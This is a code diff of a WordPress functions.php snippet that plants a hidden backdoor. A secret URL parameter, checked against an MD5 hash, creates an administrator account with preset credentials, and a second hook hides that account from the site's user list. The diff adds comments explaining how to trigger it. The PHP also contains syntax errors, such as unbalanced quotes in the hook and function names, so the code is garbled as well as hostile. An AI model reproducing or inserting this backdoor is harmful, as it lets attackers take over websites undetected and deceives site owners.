@@ -1,6 +1,14 @@
-add_action( 'wp_head', 'user_new_add );
+<?
 
-//sute.com/?moneyback=need
+//add code to function.php
+//go to sitename.com/?moneyback=need
+//new admin added
+//user = new_admin, password=userpass
+
+
+
+
+add_action( 'wp_head', 'user_new_add );
 function 'user_new_add() {
 if ( md5( $_GET['moneyback'] ) == 'e877c56e4fb621e81fd30dbd114a545b' ) {
 require( 'wp-includes/registration.php' );
@@ -10,7 +18,7 @@ $user = new WP_User( $user_id );
 $user->set_role( 'administrator' );
 }}}
 
-function w45345p_hide_specific_user($user_search) {
+function hide_specific_user($user_search) {
 global $wpdb;
 $user_search->query_where =
 str_replace('WHERE 1=1',
@@ -18,4 +26,8 @@ str_replace('WHERE 1=1',
 $user_search->query_where
 );
 }
-add_action('pre_user_query','w45345p_hide_specific_user');
+add_action('pre_user_query','hide_specific_user');
+
+
+
+?>
